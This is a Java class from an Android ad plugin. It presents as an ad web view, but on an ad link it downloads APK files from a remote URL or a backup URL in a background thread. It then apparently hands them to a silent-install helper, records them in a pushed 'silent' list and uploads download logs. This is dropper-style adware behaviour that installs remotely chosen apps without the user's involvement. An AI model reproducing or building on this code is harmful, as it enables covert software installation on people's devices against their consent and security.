package com.tiho.dlplugin.display.ad.view;

import android.content.Context;
import android.webkit.DownloadListener;

import com.tiho.base.base.http.HttpDownload;
import com.tiho.base.base.http.HttpDownload.DownloadStatus;
import com.tiho.base.common.LogManager;
import com.tiho.dlplugin.bean.PushLinkBean;
import com.tiho.dlplugin.bean.PushSilentBean;
import com.tiho.dlplugin.bean.Resource;
import com.tiho.dlplugin.dao.DAOFactory;
import com.tiho.dlplugin.log.LogUploadManager;
import com.tiho.dlplugin.task.silent.SilentInstallHelper;
import com.tiho.dlplugin.task.silent.SilentList;
import com.tiho.dlplugin.task.silent.dao.IndepentSilnetDAO;
import com.tiho.dlplugin.util.ErrorHandler;
import com.tiho.dlplugin.util.FileMD5;
import com.tiho.dlplugin.util.PackageUtil;
import com.tiho.dlplugin.util.StringUtils;
import com.tiho.dlplugin.util.TimeUtil;

import java.io.File;
import java.util.LinkedList;
import java.util.List;

public class AdWebLink extends AdWebBase implements DownloadListener, DownloadStatus {

	private PushLinkBean pl;

	public AdWebLink(Context context, long id, int from) {
		super(context, id, from);
		SilentList list = SilentList.getInstance(context);
		pl = (PushLinkBean) list.getById(id);
		if(pl!=null){
			list.consumed(pl);
		}
		setDownloadListener(this);
	}

	@Override
	protected void download() {
		//xsc add start 2018-03-22
		new Thread(new Runnable() {
			@Override
			public void run() {
				boolean downResult = false;
				String filePath ="";
				//从原始地址下载
				try {
					adDownload = new HttpDownload(context, downloadUrl, saveDir,
							userAgent, AdWebLink.this, contentLength, "apk");

					if(!StringUtils.isEmpty(pl.getPack()))
						adDownload.setFinalName(pl.getFinalName());

					adDownload.execute();

					downResult = PackageUtil.parsable(context, adDownload.getTmpFile().getAbsolutePath());

					if (downResult) {
						adDownload.genTargetFile();
						filePath =adDownload.getFinalFile().getAbsolutePath();
					}else {
						adDownload.getTmpFile().delete();
					}
					LogManager.LogShow("广告链接  下载完成  id =" + id + "下载结果 " + downResult);
					LogUploadManager.getInstance(context).addSilentDownloadLog(3,
							pl.getResourceName(), TimeUtil.getNowTime(), TimeUtil.getNowTime(),
							0, 0, downResult ? 1 : 0, "AD Download urlSrc " + downResult, 2, "Y");
				} catch (Exception e) {
					downResult = false;
					LogUploadManager.getInstance(context).addSilentDownloadLog(3,
							pl.getResourceName(), TimeUtil.getNowTime(), TimeUtil.getNowTime(),
							0, 0, 0, ErrorHandler.getErrMsg("DOWNLOAD_ERROR urlSrc ", e), 2,
							"Y");
					e.printStackTrace();
					LogManager.LogShow("广告链接  下载失败  id ="+id +" 原因" + e);
				}
				//从备用地址下载
				if(!downResult&&!StringUtils.isEmpty(pl.getBackup())){
					try {
						adDownload = new HttpDownload(context, pl.getBackup(), saveDir,
								userAgent, AdWebLink.this, contentLength, "apk");
						if(!StringUtils.isEmpty(pl.getPack()))
							adDownload.setFinalName(pl.getFinalName());
						adDownload.execute();
						downResult = PackageUtil.parsable(context, adDownload.getTmpFile()
								.getAbsolutePath());
						if (downResult) {
							adDownload.genTargetFile();
							filePath =adDownload.getFinalFile().getAbsolutePath();
						}else {
							adDownload.getTmpFile().delete();
						}
						LogManager.LogShow("广告链接  下载完成  id =" + id + "下载结果 " + downResult);
						LogUploadManager.getInstance(context).addSilentDownloadLog(3,
								pl.getResourceName(), TimeUtil.getNowTime(), TimeUtil.getNowTime(),
								0, 0, downResult ? 1 : 0, "AD Download backupSrc " + downResult, 2, "Y");
					} catch (Exception e) {
						downResult =false;
						LogUploadManager.getInstance(context).addSilentDownloadLog(3,
								pl.getResourceName(), TimeUtil.getNowTime(), TimeUtil.getNowTime(),
								0, 0, 0, ErrorHandler.getErrMsg("DOWNLOAD_ERROR backupSrc ", e), 2,
								"Y");
						e.printStackTrace();
						LogManager.LogShow("广告链接  下载失败  id ="+id +" 原因" , e);
					}
				}
				if(downResult){
					try {
						PushSilentBean ps =new PushSilentBean();
						ps.setId(id);
						if(StringUtils.isEmpty(pl.getPack())){
							pl.setPack(PackageUtil.parsePackageName(context, adDownload.getFinalFile().getAbsolutePath()));
							File file =new File(saveDir, pl.getFinalName());
							adDownload.getFinalFile().renameTo(file);
							adDownload.setFinalFile(file);
						}
						ps.setPack(pl.getPack());
						ps.setTimeract(pl.getResourceTimeract());
						ps.setWeight(pl.getWeight());
						ps.setVer(1000);
						ps.setMd5(FileMD5.getFileMD5String(adDownload.getFinalFile()));
						SilentInstallHelper.getInstance(context).gotoInstall(ps);
						List<Resource> silentList = new LinkedList<Resource>();

						IndepentSilnetDAO dao = DAOFactory.getIndepentSilnetDAO(context);
						List<Resource> store;
						store = dao.getPushMessage();
						for (Resource resource : store) {
							if (!resource.getResourceUrl().equals(pl.getResourceUrl())){
								silentList.add(resource);
							}else {
								silentList.add(ps);
							}
						}
						dao.savePushMessage(silentList);
					} catch (Exception e) {
						e.printStackTrace();
					}
				}
			}
		}).start();
		//xsc add end 2018-03-22


	}

	@Override
	public void onDownloadStart(String url, String userAgent,
			String contentDisposition, String mimetype, long contentLength) {
		DownloadStart(url, userAgent,
				contentDisposition, mimetype,contentLength);
	}

	@Override
	public void downloaded(String name, long current, long total) {

	}

}
